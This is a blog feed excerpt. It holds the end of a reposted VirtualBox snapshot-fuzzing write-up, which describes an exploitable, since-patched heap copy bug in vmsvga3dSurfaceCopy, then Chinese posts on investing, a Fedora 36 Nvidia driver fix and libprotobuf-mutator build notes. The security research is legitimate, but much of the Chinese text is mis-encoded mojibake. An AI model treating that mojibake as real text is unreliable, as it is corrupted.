USER32!GetDC\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Yep. Thatâ€™s really everything. I use this fuzz module several hours and it founds interesting crash.</p><h1 id="3-Vulnerability-TL-DR"><a href="#3-Vulnerability-TL-DR" class="headerlink" title="3. Vulnerability( TL;DR )"></a>3. Vulnerability( TL;DR )</h1><p>Crash occurred in <code>vmsvga3dSurfaceCopy</code> function( <strong>PageHeap</strong> needed ).</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah2.png" alt="blahblah2"></p><p>This function trying to copy surface data from one to another using surface id and thereâ€™s no boundary check between surface, so it become exploitable wildcopy vulnerability in heap memory.</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah3.png" alt="spot the bug"></p><p>This vulnerability patched in <a href="https://www.oracle.com/security-alerts/cpujul2022.html">6.1.36 release</a> at July, 2022.</p><h1 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h1><p>I think importance of snapshot fuzzing is, it makes researcher to focus on target itself. </p><p>Unlike other fuzzers based on runtime and DBI are often create (very) unreasonable side effect or need lots of time to create working harness. The concept of snapshot fuzzing makes it possible to reduce this waste of time.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;source: &lt;a href=&quot;https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html&quot;&gt;https://null2root.github.io/blog/</summary>
      
    
    
    
    
    <category term="Archives" scheme="http://usmacd.com/tags/Archives/"/>
    
  </entry>
  
  <entry>
    <title>å¸‚åœºæƒ…ç»ªæŒ‡æ ‡</title>
    <link href="http://usmacd.com/2022/06/30/stock_emotion/"/>
    <id>http://usmacd.com/2022/06/30/stock_emotion/</id>
    <published>2022-06-30T01:59:36.888Z</published>
    <updated>2022-06-30T01:59:36.888Z</updated>
    
    <content type="html"><![CDATA[<p>å¯ä»¥é‡åŒ–ä¸€ä¸‹ï¼Œæœ‰æ—¶é—´è€ƒè™‘ç¨‹åºå®ç°ã€‚</p><ul><li>æ¶¨&#x2F;è·Œåœæ¿æ•°</li><li>æ¶¨åœå°ç‰ˆæˆåŠŸç‡</li><li>æ¶¨è·Œè‚¡ç¥¨æ¯”ç‡</li><li>å¤§ç›˜æˆäº¤é‡é¢</li><li>èèµ„ä½™é¢æƒ…å†µ</li><li>åŒ—å‘èµ„é‡‘å‡€æµå…¥ ï¼ˆå‚è€ƒï¼‰</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¯ä»¥é‡åŒ–ä¸€ä¸‹ï¼Œæœ‰æ—¶é—´è€ƒè™‘ç¨‹åºå®ç°ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¶¨&amp;#x2F;è·Œåœæ¿æ•°&lt;/li&gt;
&lt;li&gt;æ¶¨åœå°ç‰ˆæˆåŠŸç‡&lt;/li&gt;
&lt;li&gt;æ¶¨è·Œè‚¡ç¥¨æ¯”ç‡&lt;/li&gt;
&lt;li&gt;å¤§ç›˜æˆäº¤é‡é¢&lt;/li&gt;
&lt;li&gt;èèµ„ä½™é¢æƒ…å†µ&lt;/li&gt;
&lt;li&gt;åŒ—å‘èµ„é‡‘å‡€æµå…¥ ï¼ˆå‚è€ƒï¼‰&lt;/li&gt;
&lt;/</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºå®šæŠ•çš„ä¸€äº›æ€è€ƒ</title>
    <link href="http://usmacd.com/2022/06/17/Automatic_Investment_Plan/"/>
    <id>http://usmacd.com/2022/06/17/Automatic_Investment_Plan/</id>
    <published>2022-06-17T05:02:06.256Z</published>
    <updated>2022-06-17T05:02:06.256Z</updated>
    
    <content type="html"><![CDATA[<ul><li>å®šæŠ•åªæœ‰åœ¨ä½ä¼°çš„æ—¶å€™ä¹°ï¼Œå½“ä¼°å€¼è¿›å…¥ä¸­ä½æ•°ä»¥ä¸Šå°±ä¸è¦ä¹°äº†ï¼ŒåŒæ—¶å®šæŠ•æ ‡çš„çš„ä¼°å€¼åº”è¯¥åœ¨å†å²åº•éƒ¨åŒºåŸŸã€‚</li><li>å®šæŠ•çš„æœ¬è´¨ä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œè€Œæ˜¯ç›¸ä¿¡ä¼°å€¼å›å½’ä¸­ä½æ•°ã€‚ </li><li>æŒ‡æ•°åŸºé‡‘ï¼Œå‘¨æœŸæ€§è¡Œä¸šé€‚åˆå®šæŠ•ï¼Œæ¯”å¦‚åˆ¸å•†ï¼Œé’¢é“ï¼Œç…¤ç‚­ã€‚ä¸€èˆ¬æŒ‰æ—¶é—´å®šæŠ•ï¼Œå¦‚æœå¤§å¹…ä¸‹è·Œä¹Ÿè¦ä¹°ã€‚</li></ul><p>æ€»çš„æ¥è¯´å®šæŠ•å±äºç­–ç•¥å‹çš„æŠ•èµ„æ–¹æ³•ï¼Œå…¶å®å¹¶ä¸çŸ¥é“åº•å’Œé¡¶åœ¨å“ªé‡Œï¼Œé€šè¿‡æ‹‰é•¿æ—¶é—´æ¥é™ä½æŒä»“æˆæœ¬ï¼Œå› æ­¤å®šæŠ•æˆåŠŸçš„å…³é”®åœ¨äºä½ çš„æˆæœ¬æ˜¯å¦å¯ä»¥éšç€æ—¶é—´è€Œé™ä¸‹æ¥ã€‚ä»è¿™ç‚¹ä¹Ÿå¯ä»¥åˆ†æå‡ºåœ¨åº•éƒ¨åŒºåŸŸå®šæŠ•æ¯”åœ¨é¡¶éƒ¨åŒºåŸŸå®šæŠ•è¦å¥½å¾—å¤šï¼Œè¿™ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¡ã€‚</p><p>å®šæŠ•ç­–ç•¥å¯¹å†å²çš„ä¼°å€¼æƒ…å†µæœ‰å¾ˆå¼ºçš„ä¾èµ–ï¼Œå±äºåŸºäºå†å²æ•°æ®çš„ç»Ÿè®¡åˆ†æï¼Œä½†æ˜¯æ¯ä¸€æ¬¡çš„æƒ…å†µéƒ½ä¸åŒï¼Œæ²¡æœ‰äººå¯ä»¥ä¿è¯å†å²ä¸€å®šä¼šé‡æ¼”ã€‚å®šæŠ•ä¹Ÿä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œæ²¡æœ‰æŠ¤åŸæ²³ï¼Œåªæ˜¯ç›¸ä¿¡å‡å€¼å›å½’ï¼Œè¿™æ˜¯ç¬¬äºŒæ¡ã€‚</p><p>å·´è²ç‰¹éå¸¸æ¨èæ ‡æ™®500æŒ‡æ•° (S&amp;P 500) å®šæŠ•ï¼ŒæŒ‡æ•°åŸºé‡‘æœ€ç‰›çš„åœ°æ–¹æ˜¯è‚¡ç¥¨ä¼šå®šæœŸè°ƒæ•´ï¼ŒæŠŠå¥½çš„è‚¡ç¥¨åŠ å…¥è¿›æ¥ï¼Œå·®çš„æ·˜æ±°å‡ºå»ï¼Œç›¸å½“äºæœ‰äººå¸®ä½ é€‰è‚¡äº†ï¼Œå¦å¤–è¶³å¤Ÿåˆ†æ•£ï¼Œå‘ç”Ÿç³»ç»Ÿæ€§é£é™©çš„æ¦‚ç‡å¤§å¹…é™ä½ã€‚å‘¨æœŸæ€§è¡Œä¸šåˆ™æ˜¯çˆ†å‘æ€§å¾ˆå¼ºï¼Œä¸‰å¹´ä¸å¼€å¼ ï¼Œå¼€å¼ åƒä¸‰å¹´ï¼Œå®¹æ˜“åœ¨åº•éƒ¨ç§¯ç´¯å¤§é‡ç­¹ç ï¼Œä½œä¸ºä¸€ä¸ªé•¿æœŸæŠ•èµ„ç­–ç•¥éå¸¸åˆé€‚ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;å®šæŠ•åªæœ‰åœ¨ä½ä¼°çš„æ—¶å€™ä¹°ï¼Œå½“ä¼°å€¼è¿›å…¥ä¸­ä½æ•°ä»¥ä¸Šå°±ä¸è¦ä¹°äº†ï¼ŒåŒæ—¶å®šæŠ•æ ‡çš„çš„ä¼°å€¼åº”è¯¥åœ¨å†å²åº•éƒ¨åŒºåŸŸã€‚&lt;/li&gt;
&lt;li&gt;å®šæŠ•çš„æœ¬è´¨ä¸æ˜¯ä»·å€¼æŠ•èµ„ï¼Œè€Œæ˜¯ç›¸ä¿¡ä¼°å€¼å›å½’ä¸­ä½æ•°ã€‚ &lt;/li&gt;
&lt;li&gt;æŒ‡æ•°åŸºé‡‘ï¼Œå‘¨æœŸæ€§è¡Œä¸šé€‚åˆå®šæŠ•ï¼Œæ¯”å¦‚åˆ¸å•†ï¼Œé’¢é“ï¼Œç…¤ç‚­ã€‚ä¸€èˆ¬æŒ‰æ—¶é—´å®šæŠ•ï¼Œå¦‚æœå¤§å¹…ä¸‹</summary>
      
    
    
    
    
    <category term="investment" scheme="http://usmacd.com/tags/investment/"/>
    
  </entry>
  
  <entry>
    <title>å‡çº§ Fedora 36ï¼Œé‡ä¸Š Nvidia é©±åŠ¨é—®é¢˜</title>
    <link href="http://usmacd.com/2022/05/16/Fedora36-Nvidia/"/>
    <id>http://usmacd.com/2022/05/16/Fedora36-Nvidia/</id>
    <published>2022-05-16T08:58:37.938Z</published>
    <updated>2022-05-16T08:58:37.938Z</updated>
    
    <content type="html"><![CDATA[<p>Fedora 36 æ­£å¼ç‰ˆå·²ç»é‡Šå‡ºä¸€æ®µæ—¶é—´äº†ï¼Œæ ¹æ®æˆ‘çš„ç»éªŒå¼€å§‹çš„ä¸€å‘¨éƒ½ä¼šæœ‰ bugï¼Œä¸€èˆ¬ç­‰ä¸€æ®µæ—¶é—´å†å‡çº§ä¼šæ›´å¹³æ»‘ä¸€äº›ã€‚ç„¶è€Œï¼Œè€é©å‘½åˆé‡ä¸Šäº†æ–°é—®é¢˜ï¼Œæ˜¾ç¤ºå‡ºé—®é¢˜äº†å¯åŠ¨ä¸èµ·æ¥ã€‚æˆ‘å·²ç»å¾ˆä¹…æ²¡æœ‰é‡ä¸Šæ˜¾ç¤ºé©±åŠ¨é—®é¢˜äº†ï¼Œæˆ‘åœ¨å¾ˆä¹…ä»¥å‰å°±ç¦ç”¨äº†å¼€æºé©±åŠ¨ <code>nouveau</code>ï¼Œä¸€ç›´éƒ½ç”¨å¾—å¾ˆå¥½ã€‚</p><p>ä¿®æ”¹ &#x2F;etc&#x2F;default&#x2F;grub æ–‡ä»¶ï¼Œåœ¨ <code>GRUB_CMDLINE_LINUX</code> æ·»åŠ ä¸‹é¢å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX=&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;</span><br></pre></td></tr></table></figure><p>é‡æ–°ç”Ÿæˆ grub æ–‡ä»¶ï¼Œ <code>sudo grub2-mkconfig -o /boot/grub2/grub.cfg</code>ï¼Œä½†æ˜¯åœ¨å‡çº§ Fedora 36 åä¼¼ä¹æ²¡æœ‰èµ·ä½œç”¨ã€‚è¯¡å¼‚çš„æ˜¯ Fedora 35 çš„å†…æ ¸å´å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œé¦–å…ˆæ€€ç–‘çš„æ˜¯ nvidia é©±åŠ¨å¯èƒ½æ²¡æœ‰å®‰è£…å¯¹ã€‚æ‰§è¡Œä¸‹é¢å‘½ä»¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>å¯æƒœæ²¡æœ‰è§£å†³é—®é¢˜ï¼Œä¸Šç½‘æ‰¾èµ„æ–™çœ‹çœ‹ Fedora 36 æœ‰æ²¡ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹ã€‚å®‰è£… Nvidia é©±åŠ¨ç½‘ä¸Šæœ‰è¿™ç¯‡æ–‡ç« è¯´çš„è¯¦ç»†<br><a href="https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/">https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/</a><br>ä»”ç»†æ‹œè¯»äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ²¡æœ‰å‘ç°å•¥é—®é¢˜ï¼Œé©±åŠ¨ä¹Ÿé‡æ–°å®‰è£…äº†å•Šï¼Œå¼€å§‹æ€€ç–‘æ˜¯æ–°ç‰ˆ Nvidia é©±åŠ¨çš„é—®é¢˜</p><p><code>sudo dnf search xorg-x11-drv-nvidia</code> å¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„é©±åŠ¨ï¼Œ<code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> ä¸çŸ¥é“åˆ°åº•éœ€è¦å®‰è£…å“ªä¸ªç‰ˆæœ¬çš„é©±åŠ¨ã€‚ğŸ˜­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">xorg-x11-drv-nvidia.x86_64 : NVIDIA&#x27;s proprietary display driver for NVIDIA graphic cards</span><br><span class="line">=========================================================================== åç§° å’Œ æ¦‚å†µ åŒ¹é…ï¼šxorg-x11-drv-nvidia</span><br><span class="line">xorg-x11-drv-nvidia-340xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.i686 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-340xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.i686 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-390xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.i686 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-470xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-470xx</span><br></pre></td></tr></table></figure><p>å¯æ˜¯ä»”ç»†ä¸€ç¢ç£¨ï¼Œ Fedora 35 Nvidia é©±åŠ¨ä¸æ˜¯å·¥ä½œæ­£å¸¸å—ï¼Œå¯ä»¥ä¸Šå»çœ‹çœ‹ç”¨çš„æ˜¯å“ªä¸ªç‰ˆæœ¬çš„é©±åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ <code>nvidia-settings</code>,åœ¨ System Information ä¸­å‘ç°ä½¿ç”¨çš„å°±æ˜¯æœ€æ–°ç‰ˆæœ¬çš„é©±åŠ¨ <strong>510.68.02</strong>ï¼Œçœ‹æ ·å­æœ€æ–°ç‰ˆæœ¬çš„é©±åŠ¨ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œä¸€ä¸‹é™·å…¥äº†å›°å¢ƒã€‚ğŸ˜°</p><p>æ²¡å•¥å¥½åŠæ³•ï¼Œè¿˜æ˜¯ Google æœç´¢ä¸€ä¸‹ï¼Œç»“æœå‘ç°äº†ä¸€ä¸ªé“¾æ¥åœ¨è®¨è®ºè¿™ä¸ªé—®é¢˜ï¼Œå’Œæˆ‘é‡ä¸Šçš„ç°è±¡ä¸€æ ·ï¼Œä½œè€…æœ€ç»ˆè§£å†³äº†é—®é¢˜<br><a href="https://ask.fedoraproject.org/t/fedora-linux-kernel-update-breaks-nvidia-driver/21954/11">Fedora Linux kernel update breaks NVIDIA driver</a></p><p>åŸæ¥æ˜¯æ—§ç‰ˆçš„é©±åŠ¨æ²¡æœ‰å¸è½½å¹²å‡€ï¼Œå‚è€ƒ <a href="https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver">https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver</a><br>é©±åŠ¨å¸è½½ Nvidia é©±åŠ¨éœ€è¦ä½¿ç”¨å‘½ä»¤ <code>dnf remove xorg-x11-drv-nvidia\*</code></p><p>æŒ‰ç…§ä¸‹é¢çš„å‘½ä»¤æ“ä½œäº†ä¸€éï¼Œé‡å¯ç³»ç»Ÿï¼Œç†Ÿæ‚‰çš„ç™»å½•ç•Œé¢ç»ˆäºåˆå‡ºç°äº†ã€‚ğŸ˜„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf remove xorg-x11-drv-nouveau</span><br><span class="line">sudo dnf remove xorg-x11-drv-nvidia\*</span><br><span class="line">sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Fedora 36 æ­£å¼ç‰ˆå·²ç»é‡Šå‡ºä¸€æ®µæ—¶é—´äº†ï¼Œæ ¹æ®æˆ‘çš„ç»éªŒå¼€å§‹çš„ä¸€å‘¨éƒ½ä¼šæœ‰ bugï¼Œä¸€èˆ¬ç­‰ä¸€æ®µæ—¶é—´å†å‡çº§ä¼šæ›´å¹³æ»‘ä¸€äº›ã€‚ç„¶è€Œï¼Œè€é©å‘½åˆé‡ä¸Šäº†æ–°é—®é¢˜ï¼Œæ˜¾ç¤ºå‡ºé—®é¢˜äº†å¯åŠ¨ä¸èµ·æ¥ã€‚æˆ‘å·²ç»å¾ˆä¹…æ²¡æœ‰é‡ä¸Šæ˜¾ç¤ºé©±åŠ¨é—®é¢˜äº†ï¼Œæˆ‘åœ¨å¾ˆä¹…ä»¥å‰å°±ç¦ç”¨äº†å¼€æºé©±åŠ¨ &lt;code&gt;nouveau&lt;/code&gt;</summary>
      
    
    
    
    
    <category term="linux" scheme="http://usmacd.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>libprotobuf-mutator ç®€å•åˆ†æ</title>
    <link href="http://usmacd.com/2022/05/11/libprotobuf-mutator/"/>
    <id>http://usmacd.com/2022/05/11/libprotobuf-mutator/</id>
    <published>2022-05-11T07:26:12.488Z</published>
    <updated>2022-05-11T07:26:12.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="What-are-protocol-buffers"><a href="#What-are-protocol-buffers" class="headerlink" title="What are protocol buffers?"></a><a href="https://developers.google.com/protocol-buffers/docs/overview">What are protocol buffers?</a></h2><p>Protocol buffers are Googleâ€™s language-neutral, platform-neutral, extensible mechanism for serializing structured data â€“ think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p><p>è¿™æ®µæ˜¯ Google å®˜æ–¹ç½‘ç«™ç»™å‡ºçš„ä»‹ç»ï¼Œprotobuf å¯ä»¥è‡ªåŠ¨åŒ–ç”Ÿæˆä»£ç ï¼Œç”¨äºè¯»å…¥æˆ–è€…å†™å…¥ç»“æ„åŒ–æ•°æ®ã€‚ä¸€ä¸ªç®€å•çš„ protobuf æ–‡ä»¶å¯ä»¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message </span><span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">int32</span> id = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“çš„è¯­æ³•å¯ä»¥å‚è€ƒGoogle çš„æ–‡æ¡£ <a href="https://developers.google.com/protocol-buffers/docs/proto">proto2</a> å’Œ <a href="https://developers.google.com/protocol-buffers/docs/proto3">proto3</a>ã€‚c++ è¯­è¨€ä½¿ç”¨ protobuf çš„ç¤ºä¾‹å¯ä»¥å‚è§<a href="https://developers.google.com/protocol-buffers/docs/cpptutorial">Protocol Buffer Basics: C++</a> æ–‡æ¡£ï¼ŒåŸºæœ¬æ­¥éª¤æ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li>å†™ protobuf æ–‡ä»¶ï¼Œè¡¨è¾¾æ•°æ®ç»“æ„</li><li>åˆ©ç”¨ protoc è‡ªåŠ¨ç”Ÿæˆä»£ç  ï¼ˆæ”¯æŒå¤šç§è¯­è¨€ C++ Java ç­‰ï¼‰</li><li>åˆ©ç”¨ç”Ÿæˆçš„æ–‡ä»¶è§£ææˆ–è€…å†™å…¥ç›¸å…³æ•°æ®ç»“æ„</li></ol><h2 id="libprotobuf-mutator"><a href="#libprotobuf-mutator" class="headerlink" title="libprotobuf-mutator"></a>libprotobuf-mutator</h2><h3 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h3><p>å‚è€ƒï¼š <a href="https://github.com/google/libprotobuf-mutator/blob/master/README.md">https://github.com/google/libprotobuf-mutator/blob/master/README.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/libprotobuf-mutator.git</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug</span><br><span class="line">https_proxy=http://127.0.0.1:3128 ninja check</span><br></pre></td></tr></table></figure><p>ç”±äºéœ€è¦ä»Googleä¸‹è½½ä¸€äº›æºç ï¼Œæ‰€ä»¥åœ¨ <code>ninja check</code> çš„æ—¶å€™éœ€è¦æŒ‚ä¸Šä»£ç†ï¼Œç»“æœç¼–è¯‘å‡ºé”™äº†ï¼Œæ‰¾ä¸åˆ° <code>libxml2.a</code>ï¼Œæ’æŸ¥ä¸€ä¸‹ç¼–è¯‘å‚æ•°ï¼Œå‘ç°éœ€è¦æ·»åŠ ç¼–è¯‘é™æ€åº“çš„å‚æ•°</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/cmake/external/libxml2.cmake b/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="comment">index c00ace2..a944fab 100644</span></span><br><span class="line"><span class="comment">--- a/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="comment">+++ b/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span> ExternalProject_Add($&#123;LIBXML2_TARGET&#125;</span><br><span class="line">     UPDATE_COMMAND &quot;&quot;</span><br><span class="line">     CONFIGURE_COMMAND $&#123;LIBXML2_SRC_DIR&#125;/autogen.sh --without-python</span><br><span class="line">                                                     --prefix=$&#123;LIBXML2_INSTALL_DIR&#125;</span><br><span class="line"><span class="addition">+                                                    --enable-static=yes</span></span><br><span class="line">                                                     CC=$&#123;CMAKE_C_COMPILER&#125;</span><br><span class="line">                                                     CXX=$&#123;CMAKE_CXX_COMPILER&#125;</span><br><span class="line">                                                     CFLAGS=$&#123;LIBXML2_CFLAGS&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åå¯ä»¥æ­£å¸¸é€šè¿‡ <code>ninja check</code> å‘½ä»¤çš„æ‰€æœ‰æ£€æŸ¥ã€‚é»˜è®¤æƒ…å†µä¸‹ <code>ninja install</code> ä¼šå®‰è£…åˆ° &#x2F;usr&#x2F;local ç›®å½•ï¼Œå› ä¸ºè€ƒè™‘åˆ°åç»­éœ€è¦ç»™ <code>afl+</code>ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ä¸‹çš„å‘½ä»¤é‡æ–° cmake ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug</span><br></pre></td></tr></table></figure><h3 id="libprotobuf-mutator-ä»£ç å®ç°"><a href="#libprotobuf-mutator-ä»£ç å®ç°" class="headerlink" title="libprotobuf-mutator ä»£ç å®ç°"></a>libprotobuf-mutator ä»£ç å®ç°</h3><p>libfuzzer_macro.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto)                 \</span></span><br><span class="line"><span class="meta">  extern <span class="string">&quot;C&quot;</span> int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \</span></span><br><span class="line"><span class="meta">    using protobuf_mutator::libfuzzer::LoadProtoInput;                      \</span></span><br><span class="line"><span class="meta">    Proto input;                                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (LoadProtoInput(use_binary, data, size, &amp;input))                     \</span></span><br><span class="line"><span class="meta">      TestOneProtoInput(input);                                             \</span></span><br><span class="line"><span class="meta">    return 0;                                                               \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using default</span></span><br><span class="line"><span class="comment">// serialization format. Default is text.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_PROTO_FUZZER(arg) 